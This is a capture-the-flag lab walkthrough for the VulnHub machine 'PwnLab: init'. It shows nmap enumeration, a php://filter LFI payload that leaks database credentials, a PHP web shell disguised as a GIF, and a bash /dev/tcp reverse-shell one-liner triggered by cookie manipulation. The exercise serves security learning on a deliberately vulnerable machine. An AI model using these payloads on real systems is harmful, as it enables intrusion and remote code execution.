# PwnLab: init

- **Machine:** PwnLab: init
- **Download:** https://www.vulnhub.com/entry/pwnlab-init,158/

![](844-1.png)

---

# Machine Setup

1. Open the downloaded OVA file in VirtualBox.
2. Click **Finish**.
3. Start the virtual machine.

---

# Network Scanning

## Discover the Target IP

```bash
nmap -sn 192.168.2.0/24
```

![](844-2.png)

---

## Full Nmap Scan

Perform a complete scan to identify open ports, running services, operating system information, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.222
```

![](844-3.png)

---

## Optional Port Enumeration

```bash
nmap -v -p- 192.168.2.222
```

```bash
nmap -sC -sV -A 192.168.2.222
```

---

## HTTP Enumeration

Run the HTTP enumeration NSE script.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.222
```

![](844-4.png)

---

# Web Enumeration

Browse the following pages.

```text
http://192.168.2.222
http://192.168.2.222/login.php
http://192.168.2.222/images/
```

---

## Login Page

Click the **Login** button or visit:

```text
http://192.168.2.222/?page=login
```

![](844-5.png)

The application loads pages through the `page` parameter, indicating a potential **Local File Inclusion (LFI)** vulnerability.

---

## Exploiting the LFI

Capture the request using Burp Suite.

![](844-6.png)

Send the request to **Repeater** and replace the parameter with:

```text
?page=php://filter/convert.base64-encode/resource=config
```

![](844-7.png)

The response contains Base64-encoded PHP source.

Decode it.

```bash
echo 'PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+' | base64 -d
```

![](844-8.png)

Recovered database configuration:

```php
<?php
$server   = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>
```

---

# MySQL Enumeration

Connect to the remote MySQL service.

```bash
mysql --skip-ssl -h 192.168.2.222 Users -u root -pH4u%QJ_H99
```

![](844-9.png)

Enumerate the users table.

```sql
SELECT * FROM users;
```

![](844-10.png)

The stored passwords are Base64 encoded.

Decode each value.

```bash
echo 'Sld6WHVCSkpOeQ==' | base64 -d
```

```bash
echo 'U0lmZHNURW42SQ==' | base64 -d
```

```bash
echo 'aVN2NVltMkdSbw==' | base64 -d
```

![](844-11.png)

Recovered credentials:

| Username | Password |
|-----------|----------|
| kent | JWzXuBJJNy |
| mike | SIfdsTEn6I |
| kane | iSv5Ym2GRo |

---

# User Authentication

Login to the application.

```text
http://192.168.2.222/?page=login
```

![](844-12.png)

After successful authentication, navigate to the upload page.

```text
http://192.168.2.222/?page=upload
```

![](844-13.png)

---

# Uploading a Web Shell

Create a PHP web shell disguised as a GIF image.

```bash
nano shell.php.gif
```

Insert the following content.

```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

Upload the file through the upload page.

![](844-14.png)

After uploading, verify the uploaded file under the upload directory.

![](844-15.png)

---

# Reverse Shell

Start a Netcat listener on the attack machine.

```bash
nc -lvnp 443
```

Trigger the uploaded shell by abusing the application's cookie.

```bash
curl -b "lang=../upload/a131d09d22d1ec4f204e952068447736.gif" "http://192.168.2.222/?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.2.219/443+0>%261'"
```

![](844-16.png)

A reverse shell is established.

![](844-17.png)

---

# Key Learning

- Enumerate every application parameter for Local File Inclusion vulnerabilities.
- The `php://filter` wrapper can disclose PHP source code without executing it.
- Configuration files frequently expose database credentials.
- Review database contents for reusable user credentials.
- Weak upload validation can allow web shell uploads by bypassing file type checks.
- Cookies may be manipulated to force inclusion of attacker-controlled files.
- Always obtain an interactive shell before beginning privilege escalation.

---

# Summary

The target was enumerated with Nmap, revealing a web application vulnerable to **Local File Inclusion (LFI)**. By abusing the `php://filter` wrapper, the application's configuration file was disclosed, exposing MySQL credentials. After connecting to the database, user credentials were recovered by decoding Base64-encoded passwords. Following authentication to the web application, a PHP web shell disguised as a GIF image was uploaded. Finally, the application was tricked into including the uploaded file through a manipulated cookie, resulting in remote code execution and a reverse shell on the target system.